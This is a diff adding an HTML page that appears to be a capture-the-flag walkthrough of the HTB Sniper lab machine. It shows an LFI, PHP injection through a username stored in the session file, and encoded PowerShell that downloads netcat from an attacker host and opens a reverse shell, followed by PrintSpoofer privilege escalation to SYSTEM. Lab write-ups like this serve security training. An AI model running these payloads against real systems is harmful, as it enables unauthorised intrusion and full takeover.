@@ -1,0 +1,179 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Sniper</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 5.7</p>
+    <h2 class="subtitle">Enumeration</h2>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper]
+<u>└─$ sudo nmap -p- -sCV $IP --min-rate=10000</u>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 19:01 EST
+Nmap scan report for 10.129.229.6
+Host is up (0.28s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-title: Sniper Co.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+
+<p class="text">HTTP is open. No other interesting ports.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sniper/1.png' %}" alt="">
+    <p class="text">There are links we can visit other pages. The one navigates us to /blog folder, and another one navigates us to login page.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/sniper/2.png' %}" alt="">
+    <p class="text">The language button uses php file for lang parameter. It might allow us to perform LFI. It's often doesn't return file contents even if LFI can be caused. So, we should observe reaction with burpsuite or curl command.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper]
+└─$ curl -G http://10.129.229.6/blog/ --data-urlencode 'lang=/windows/win.ini'
+...
+&lt;/body>
+
+&lt;/html>
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+&lt;/body>
+&lt;/html></code></pre></div>
+
+<p class="text">It returned win.ini file contents. We might find other files we can use for revshell.</p>
+
+
+<h2 class="subtitle">FootHold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/sniper/3.png' %}" alt="">
+    <p class="text">When I registered account via /user/registoration.php and logged on, it revealed that the user portal is under development. However, php session id is set. On the windows system, the session file would be stored in C:\windows\temp folder. Since we know there is LFI vulnerability, we can read it.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper]
+└─$ curl -G http://10.129.229.6/blog/ --data-urlencode 'lang=/windows/temp/sess_c5jnkrl843e15f9dm0dbkkps2q'
+...
+&lt;/body>
+
+&lt;/html>
+username|s:4:"test";</body>
+&lt;/html></code></pre></div>
+
+<p class="text">This file seems to include username. So, if we can inject php code using username variable, we might be able to execute powershell script.</p>
+<p class="text">Let's test if we can do that.</p>
+<p class="text">I set username like below :</p>
+<div class="code-box"><pre><code>&lt;?=`powershell whoami;`?></code></pre></div>
+<p class="text">Then queried like before :</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper]
+└─$ curl -G http://10.129.229.6/blog/ --data-urlencode 'lang=/windows/temp/sess_b7q80taabf0p094mdfg9lae9iv'
+...
+username|s:24:"nt authority\iusr
+...</code></pre></div>
+
+<p class="text">It successfully output SNP nt authority\iusr.</p>
+<p class="text">Since we could execute powershell command, we can use nc.exe to the target machine and execute it.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper/1]
+└─$ python3 -m http.server 80</code></pre></div>
+<p class="text">Then, let's create user whose username is nc.exe execution code.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper/1]
+└─$ cat 1wget http://10.10.16.26/nc64.exe -o C:\Windows\TEMP\nc.exe
+                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/sniper/1]
+└─$ cat 1 | iconv -t utf-16le | base64 -w0
+dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgA2AC8AbgBjADYANAAuAGUAeABlACAALQBvACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAAXABuAGMALgBlAHgAZQAKAA==  </code></pre></div>
+<p class="text">Then, name a new user like below :</p>
+<div class="code-box"><pre><code>&lt;?=`powershell /enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgA2AC8AbgBjADYANAAuAGUAeABlACAALQBvACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAAXABuAGMALgBlAHgAZQAKAA== `?></code></pre></div>
+<p class="text">When we curl session file like before, nc64.exe would be requested from the target machine.</p>
+<p class="text">Next, let's execute this.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper/1]
+└─$ cat 2                                 
+C:\windows\temp\nc.exe -e cmd.exe 10.10.16.26 4444
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/sniper/1]
+└─$ cat 2 | iconv -t utf-16le | base64 -w0
+QwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAAXABuAGMALgBlAHgAZQAgAC0AZQAgAGMAbQBkAC4AZQB4AGUAIAAxADAALgAxADAALgAxADYALgAyADYAIAA0ADQANAA0AAoA </code></pre></div>
+
+<p class="text">And create new user like before</p>
+<div class="code-box"><pre><code>&lt;?=`powershell /enc QwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAAXABuAGMALgBlAHgAZQAgAC0AZQAgAGMAbQBkAC4AZQB4AGUAIAAxADAALgAxADAALgAxADYALgAyADYAIAA0ADQANAA0AAoA`?></code></pre></div>
+<p class="text">When we query the newly created session file, reverse shell will be created.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/sniper/1]
+└─$ curl -G http://10.129.229.6/blog/ --data-urlencode 'lang=/windows/temp/sess_b7q80taabf0p094mdfg9lae9iv'
+
+
+┌──(kali㉿kali)-[~/tempo/sniper]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.26] from (UNKNOWN) [10.129.229.6] 49764
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\blog></code></pre></div>
+
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">We have SeImpersonatePrivilege.</p>
+<div class="code-box"><pre><code>C:\inetpub\wwwroot\blog>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name          Description                               State  
+======================= ========================================= =======
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+<u>SeImpersonatePrivilege</u>  Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects                     Enabled</code></pre></div>
+
+<p class="text">Also, we can see the target's server version.</p>
+
+<div class="code-box"><pre><code>C:\inetpub\wwwroot\blog>systeminfo
+systeminfo
+
+Host Name:                 SNIPER
+OS Name:                   Microsoft Windows <u>Server 2019 Standard</u>
+...</code></pre></div>
+<p class="text">Since its server is 2019 standard, we can use PrintSpoofer64.exe. Let's download it and use it.</p>
+<div class="code-box"><pre><code>C:\ProgramData>net use \\10.10.16.26\share /user:a a
+net use \\10.10.16.26\share /user:a a
+The command completed successfully.
+
+
+C:\ProgramData>copy \\10.10.16.26\share\PrintSpoofer64.exe
+copy \\10.10.16.26\share\PrintSpoofer64.exe
+        1 file(s) copied.</code></pre></div>
+
+        <p class="text">We can generate new cmd shell using this exe file.</p>
+        <div class="code-box"><pre><code>C:\ProgramData>.\PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system</code></pre></div>
+
+<p class="text">We got NA user.</p>
+
+</body>
+</html>
